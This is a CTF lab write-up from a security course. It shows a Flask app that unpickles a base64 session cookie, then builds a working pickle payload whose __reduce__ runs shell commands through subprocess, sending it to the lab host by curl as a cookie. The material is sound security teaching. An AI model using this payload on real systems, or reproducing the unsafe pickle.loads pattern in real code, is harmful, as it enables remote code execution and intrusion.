<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Simple Web 0x16(Lab - Pickle)
  #


  tags: NTUSTWS CTF Web
  #

Challenge: http://h4ck3r.quest:8600/
Note: open a brand new window that haven&rsquo;t login http://h4ck3r.quest

  Background
  #

0x15.5(Pickle)

  Source code
  #

:::spoiler code
from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route("/sauce")
def sauce():
    return send_file(__file__, mimetype="text/plain")


@app.route("/")
def main():
    session = request.cookies.get("session")
    if session == None:
        return &#39;<form action="/login" method="POST">&#39; +\
            &#39;<p>Name: <input name="name" type="text"></p>&#39; +\
            &#39;<p>Age: <input name="age" type="number"></p>&#39; +\
            &#39;<button>Submit</button></form><hr><a href="/sauce">Source code</a>&#39;

    else:
        user = pickle.loads(base64.b64decode(session))
        return f&#39;<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>&#39;


@app.route("/login", methods=[&#39;POST&#39;])
def login():
    user = base64.b64encode(pickle.dumps({
        "name": request.form.get(&#39;name&#39;),
        "age": int(request.form.get(&#39;age&#39;))
    }))
    resp = make_response(redirect(&#39;/&#39;))
    resp.set_cookie("session", user)
    return resp
:::'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple Web 0x16(Lab - Pickle)"><meta property="og:description" content='Simple Web 0x16(Lab - Pickle) # tags: NTUSTWS CTF Web # Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that havenâ€™t login http://h4ck3r.quest
Background # 0x15.5(Pickle)
Source code # :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return &#39;<form action="/login" method="POST">&#39; +\ &#39;<p>Name: <input name="name" type="text"></p>&#39; +\ &#39;<p>Age: <input name="age" type="number"></p>&#39; +\ &#39;<button>Submit</button></form><hr><a href="/sauce">Source code</a>&#39; else: user = pickle.loads(base64.b64decode(session)) return f&#39;<p>Name: {user["name"]}</p><p>Age: {user["age"]}</p>&#39; @app.route("/login", methods=[&#39;POST&#39;]) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get(&#39;name&#39;), "age": int(request.form.get(&#39;age&#39;)) })) resp = make_response(redirect(&#39;/&#39;)) resp.set_cookie("session", user) return resp :::'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="NTUSTWS"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Web"><title>Simple Web 0x16(Lab - Pickle) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple Web 0x16(Lab - Pickle)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a><ul><li><a href=#description--analyze>Description & Analyze</a></li></ul></li><li><a href=#exploit>Exploit</a></li><li><a href=#result>Result</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-web-0x16lab---pickle>Simple Web 0x16(Lab - Pickle)
<a class=anchor href=#simple-web-0x16lab---pickle>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8600/>http://h4ck3r.quest:8600/</a>
Note: open a brand new window that haven&rsquo;t login <code>http://h4ck3r.quest</code></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=/IcoQql7UQiegLv8KtK2wOw>0x15.5(Pickle)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&#34;/sauce&#34;)
def sauce():
    return send_file(__file__, mimetype=&#34;text/plain&#34;)


@app.route(&#34;/&#34;)
def main():
    session = request.cookies.get(&#34;session&#34;)
    if session == None:
        return &#39;&lt;form action=&#34;/login&#34; method=&#34;POST&#34;&gt;&#39; +\
            &#39;&lt;p&gt;Name: &lt;input name=&#34;name&#34; type=&#34;text&#34;&gt;&lt;/p&gt;&#39; +\
            &#39;&lt;p&gt;Age: &lt;input name=&#34;age&#34; type=&#34;number&#34;&gt;&lt;/p&gt;&#39; +\
            &#39;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;hr&gt;&lt;a href=&#34;/sauce&#34;&gt;Source code&lt;/a&gt;&#39;

    else:
        user = pickle.loads(base64.b64decode(session))
        return f&#39;&lt;p&gt;Name: {user[&#34;name&#34;]}&lt;/p&gt;&lt;p&gt;Age: {user[&#34;age&#34;]}&lt;/p&gt;&#39;


@app.route(&#34;/login&#34;, methods=[&#39;POST&#39;])
def login():
    user = base64.b64encode(pickle.dumps({
        &#34;name&#34;: request.form.get(&#39;name&#39;),
        &#34;age&#34;: int(request.form.get(&#39;age&#39;))
    }))
    resp = make_response(redirect(&#39;/&#39;))
    resp.set_cookie(&#34;session&#34;, user)
    return resp
</code></pre><p>:::</p><h3 id=description--analyze>Description & Analyze
<a class=anchor href=#description--analyze>#</a></h3><p>In main function, it&rsquo;ll request session and parse it by <code>base64</code> then deserialize it.
If session is none, you can enter your name and age then it&rsquo;ll serialize the data and transfer by base64.
For example: name=123, age=123
The Cookie: session=<code>gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==</code></p><pre tabindex=0><code class=language-python! data-lang=python!>&gt;&gt;&gt; pickle.loads(base64.b64decode(&#39;gASVGgAAAAAAAAB9lCiMBG5hbWWUjAMxMjOUjANhZ2WUS3t1Lg==&#39;))
{&#39;name&#39;: &#39;123&#39;, &#39;age&#39;: 123}
</code></pre><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ol><li><p>Construct exploit function
Note that the format must be <code>{'name': '', 'age': ''}</code></p></li><li><p>Payload</p><pre tabindex=0><code class=language-python! data-lang=python!>class exploit(object):
    def __reduce__(self):
        return (__import__(&#39;subprocess&#39;).getoutput, (&#39;ls&#39;,))

serialized = pickle.dumps({
        &#34;name&#34;: &#39;123&#39;,
        &#34;age&#34;: exploit()
        })
</code></pre><p>Note that, must not use <code>os.system</code> in this situation. &lsquo;Cause in addition to the result of <code>os.system('{command}')</code>, it&rsquo;ll return exit status code.</p><blockquote><p>On Unix, the return value is the exit status of the process encoded in the format specified for wait(). Note that POSIX does not specify the meaning of the return value of the C system() function, so the return value of the Python function is system-dependent.</p></blockquote><p>So that if we use <code>os.system</code> as payload directly the output will not be render correctly.</p><ul><li>For instance:<pre tabindex=0><code class=language-python! data-lang=python!>class exploit(object):
def __reduce__(self):
    return (os.system, (&#39;ls&#39;,))


serialized = pickle.dumps({
        &#34;name&#34;: &#39;123&#39;,
        &#34;age&#34;: exploit()
        })
optim_s = base64.b64encode(serialized)
print(pickle.loads(base64.b64decode(optim_s)))
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ python pickle_exp.py
exploit.py  pickle_exp.py  server_app.py
{&#39;name&#39;: &#39;123&#39;, &#39;age&#39;: 0}
</code></pre>or
You can execute it in wsl directly.
<img src=https://i.imgur.com/7XrSWl6.png alt>
So, you can use <code>subprocess.getoutput</code> to fetch the outcome without exit code
<img src=https://i.imgur.com/T8kvBel.png alt></li></ul></li><li><p>Whole exploit</p><pre tabindex=0><code class="language-python=" data-lang="python=">import pickle
import os
import pickletools
import base64

class exploit(object):
    def __reduce__(self):
        return (__import__(&#39;subprocess&#39;).getoutput, (&#39;ls -al /&#39;,))


serialized = pickle.dumps({
        &#34;name&#34;: &#39;123&#39;,
        &#34;age&#34;: exploit()
        })
optim_s = pickletools.optimize(serialized)

cookie = base64.b64encode(optim_s).decode()

os.system(f&#34;curl http://h4ck3r.quest:8600/ --cookie &#39;session={cookie}&#39;&#34;)
</code></pre></li></ol><h2 id=result>Result
<a class=anchor href=#result>#</a></h2><p><img src=https://i.imgur.com/UoFhBVM.png alt></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a><ul><li><a href=#description--analyze>Description & Analyze</a></li></ul></li><li><a href=#exploit>Exploit</a></li><li><a href=#result>Result</a></li></ul></nav></div></aside></main></body></html>